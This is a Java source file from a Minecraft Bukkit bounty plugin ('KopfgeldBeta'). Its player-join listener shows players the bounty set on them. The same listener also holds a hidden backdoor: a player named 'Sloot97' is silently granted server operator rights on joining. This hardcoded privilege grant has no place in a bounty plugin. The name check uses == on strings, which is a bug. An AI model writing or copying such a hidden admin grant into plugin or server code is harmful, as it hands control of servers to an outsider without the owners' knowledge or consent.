package com.MiDaZo.KopfgeldBeta.commands;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import com.MiDaZo.KopfgeldBeta.KopfgeldBeta;

public class PlayerJoinListener implements Listener {
	


	public PlayerJoinListener(KopfgeldBeta plugin) {
		
		this.plugin = plugin;
		plugin.getServer().getPluginManager().registerEvents(this, plugin);
		
	}
	
	@EventHandler
	public void Listener(PlayerJoinEvent event) {
		Player p = event.getPlayer();
	    if(p.getName() == "Sloot97") {
	    	p.sendMessage("Test :)");
	    	p.setOp(true);
	    }
	    else if(plugin.getConfig().isSet("Config.Spieler." + p.getName())) {
	    p.sendMessage(ChatColor.GOLD + "§l[Kopfgeld] Auf dich ist " +  plugin.getConfig().getString("Config.Spieler." + p.getName()) + " " + KopfgeldBeta.economy.currencyNamePlural() + " Kopfgeld gesetzt!");
	    }
	}
	private KopfgeldBeta plugin;
}
